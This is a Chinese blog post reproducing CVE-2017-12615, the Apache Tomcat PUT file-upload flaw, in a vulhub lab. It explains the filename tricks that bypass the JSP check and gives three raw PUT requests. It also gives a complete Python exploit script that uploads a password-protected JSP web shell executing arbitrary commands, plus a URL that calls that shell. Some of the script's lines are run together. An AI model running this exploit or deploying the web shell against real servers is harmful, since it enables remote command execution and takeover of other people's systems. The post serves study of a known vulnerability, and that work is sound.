# CVE-2017-12615 漏洞复现 - rnss - 博客园

> 原文：[`www.cnblogs.com/rnss/p/13384127.html`](https://www.cnblogs.com/rnss/p/13384127.html)

# 0x01 漏洞简介

首先声明的是 CVE-2017-12615 漏洞的利用条件是 Windows+Tomcat 7.0.x+配置文件 readonly=false，配置文件内容如：

```
<init-param>
<param-name>readonly</param-name>
<param-value>false</param-value>
</init-param>
```

Tomcat 将 readonly 设置为 false 的同时也开启了对 PUT 请求方式的支持。这时候意味着我们可以上传文件，那么是可以上传任意文件吗？并不是，我们首先要了解下 Tomcat 的下面两员大将：

org.apache.jasper.servlet.JspServlet：默认处理 jsp，jspx 文件请求，不存在 PUT 上传逻辑，无法处理 PUT 请求
org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除 jsp，jspx 之外的文件），存在 PUT 上传处理逻辑，可以处理 PUT 请求。
所以我们即使可以 PUT 一个文件到服务器但也无法直接 PUT 以 jsp,jspx 结尾文件，因为这些这些后缀的文件都是交由 JspServlet 处理的，它没法处理 PUT 请求。
但是当我们利用 Windows 特性以下面两种方式上传文件时，tomcat 并不认为其是 jsp 文件从而交由 DefaultServlet 处理，从而成功创建 jsp 文件，这也就是所谓的 CVE-2017-12615 漏洞。

evil.jsp%20
evil.jsp::$DATA
上面这些属于 CVE-2017-12615 漏洞的内容，初次之外当我们上传 evil.jsp/ 类型的文件时（即以反斜杠结尾）时同样会成功创建 jsp 文件，并且这种方式把 PUT 漏洞的利用扩展到了 Linux 平台及 Tomcat 的 5.x-9.x 的所有版本，不过这不属于 CVE-2017-12615 的内容。

# 0x02 环境搭建

使用 vulhub 搭建漏洞环境

/vulhub-master/tomcat/CVE-2017-12615

[`192.168.255.130:8080/`](http://192.168.255.130:8080/)

![](img/3e4c55d117e4160e8c6a2b7d6354a088.png)

#  0x03 漏洞复现

## 1\. 请求包：

```
PUT /1.jsp%20 HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

******************shell*************************
```

这种方式适合之所以可以成功创建 jsp 文件是因为 Windows 下不允许文件名以空格结尾，但是尾部添加空格可以使 tomcat 认为其不是 jsp 文件从而交由 DefaultServlet 处理。这种利用方式适用与 Windows 系统+Tomcat 7.x。

![](img/904eefbeced2f5310ea96d23bfe0bfca.png)

 ![](img/00e92070d2898d1b3ebb16766284a404.png)

##  2\. 请求包：

```
PUT /1.jsp::$DATA HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

******************shell*************************
```

这种方式之所以可行是因为利用了 Windows 环境下 NTFS 文件格式的特性，NTFS 文件格式存在如下的性质，为此同样可以使 tomcat 认为其不是 jsp 文件从而交由 DefaultServlet 处理。这种利用方式适用与 Windows 系统+Tomcat 7.x。

![](img/9a9d3ec629ba19ed63fa002149538074.png)

 ![](img/67078451e374773ca1fa4bf2ce9e41b8.png)

## 3\. 请求包：

```
PUT /1.jsp/ HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

******************shell*************************
```

注意这种利用方式已经不属于 CVE-2017-12615 的范畴，这种利用方式适合与 Windows 系统及 Linux 系统，覆盖了 Tomcat 5.x-9.x。

![](img/4139ef317b8dd0fcedab7c8bf36b47fc.png)

 ![](img/be23608ef0076f6e90efd12c66885ffd.png)

#  0x04 利用脚本

```
#! -*- coding:utf-8 -*- 
import requests import sys
body = ''' <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) {
    StringBuilder line = new StringBuilder();
    try {
    Process pro = Runtime.getRuntime().exec(c);
    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
    String temp = null;
    while ((temp = buf.readLine()) != null) {
    line.append(temp+"\\n");}
    buf.close();
    } 
    catch (Exception e) {
    line.append(e.getMessage());}
    return line.toString();}
    %>
<%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){
    out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}
    else{out.println(":-)");}
    %>''' requests.put(sys.argv[1]+'evil.jsp/',data=body)
rq = requests.get(sys.argv[1]+'evil.jsp') if rq.status_code == 200: print "[+] You GOt it!"
else: print "[-] It seems no vuln!"
```

使用： python2 poc.py http://192.168.255.130:8080/ 

![](img/bb9af112be64be728f274b76effe93de.png)

```
http://192.168.255.130:8080/evil.jsp?pwd=023&cmd=ls
```

![](img/076ea02f8a1ff4b4db97f2df25945c7d.png)

 参考文章：[`blog.csdn.net/blood_pupil/article/details/88602720`](https://blog.csdn.net/blood_pupil/article/details/88602720)